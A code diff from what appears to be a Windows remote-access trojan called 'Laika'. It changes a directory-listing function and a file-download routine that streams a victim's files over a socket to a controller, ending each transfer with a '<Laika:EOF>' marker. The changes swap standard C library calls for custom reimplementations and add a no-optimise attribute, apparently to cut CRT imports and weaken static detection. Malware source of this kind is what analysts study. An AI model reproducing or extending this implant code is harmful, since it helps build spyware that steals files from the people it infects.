@@ -38,14 +38,14 @@ char get_obj_info(const char* path) {
     }
 }
 
-char* get_file_list(const char* dirPath, int* numFiles) {
+LAIKA_NOOPT char* get_file_list(const char* dirPath, int* numFiles) {
     WIN32_FIND_DATA findData;
     HANDLE hFind = NULL;
 
     WCHAR searchPath[MAX_PATH];
     mbstowcs_(searchPath, dirPath, MAX_PATH);
 
-    wcscat(searchPath, L"\\*.*");
+    wcscat_(searchPath, L"\\*.*");
 
     hFind = Api.FindFirstFileW(searchPath, &findData);
     if (hFind == INVALID_HANDLE_VALUE) {
@@ -60,12 +60,12 @@ char* get_file_list(const char* dirPath, int* numFiles) {
     do {
         // Convert the file/folder name to a char string
         WCHAR wFileName[MAX_PATH];
-        wcscpy(wFileName, findData.cFileName);
+        wcscpy_(wFileName, findData.cFileName);
         char fileName[MAX_PATH];
         wcstombs_(fileName, wFileName, MAX_PATH);
 
         // Ignore the "." and ".." folders
-        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
+        if (strcmp_(fileName, ".") == 0 || strcmp_(fileName, "..") == 0) {
             continue;
         }
 
@@ -74,8 +74,8 @@ char* get_file_list(const char* dirPath, int* numFiles) {
             maxFiles *= 2;
             fileList = (char**)Api.Heaprealloc_(_crt_heap, HEAP_ZERO_MEMORY, fileList, maxFiles * sizeof(char*));
         }
-        fileList[numFound] = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, strlen(fileName) + 1);
-        strcpy(fileList[numFound], fileName);
+        fileList[numFound] = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, strlen_(fileName) + 1);
+        strcpy_(fileList[numFound], fileName);
         numFound++;
     } while (Api.FindNextFileW(hFind, &findData) != 0);
 
@@ -84,16 +84,16 @@ char* get_file_list(const char* dirPath, int* numFiles) {
     // Allocate a buffer to store the concatenated file/folder names separated by "/"
     int bufferSize = 0;
     for (int i = 0; i < numFound; i++) {
-        bufferSize += strlen(fileList[i]) + 1; // add 1 for the separator
+        bufferSize += strlen_(fileList[i]) + 1; // add 1 for the separator
     }
     char* fileNames = (char*)Api.HeapAlloc(_crt_heap, HEAP_ZERO_MEMORY, bufferSize);
     fileNames[0] = '\0';
 
     // Concatenate the file/folder names separated by "/"
     for (int i = 0; i < numFound; i++) {
-        strcat(fileNames, fileList[i]);
+        strcat_(fileNames, fileList[i]);
         if (i < numFound - 1) {
-            strcat(fileNames, "/");
+            strcat_(fileNames, "/");
         }
         Api.Heapfree_(_crt_heap, 0, fileList[i]);
     }
@@ -183,7 +183,7 @@ int download_file(HANDLE fp, SOCKET sock) {
                     // If send would block, wait until the socket is writable
                     fd_set write_fds;
                     FD_ZERO(&write_fds);
-                    FD_SET(sock, &write_fds);
+                    FD_SET_(sock, &write_fds);
 
                     if (Api.select(sock + 1, NULL, &write_fds, NULL, NULL) == SOCKET_ERROR) {
                         Api.Heapfree_(_crt_heap, 0, data);
@@ -193,7 +193,7 @@ int download_file(HANDLE fp, SOCKET sock) {
                     }
                 }
                 else {
-					Api.send(sock, "<Laika:EOF>", strlen("<Laika:EOF>"), 0);
+					Api.send(sock, "<Laika:EOF>", strlen_("<Laika:EOF>"), 0);
                     Api.Heapfree_(_crt_heap, 0, data);
                     Api.CloseHandle(fp);
                     Sleep_(Sleep_TIME);
@@ -207,7 +207,7 @@ int download_file(HANDLE fp, SOCKET sock) {
         }
     }
 
-	Api.send(sock, "<Laika:EOF>", strlen("<Laika:EOF>"), 0);
+	Api.send(sock, "<Laika:EOF>", strlen_("<Laika:EOF>"), 0);
     Api.CloseHandle(fp);
     Api.Heapfree_(_crt_heap, 0, data);
 
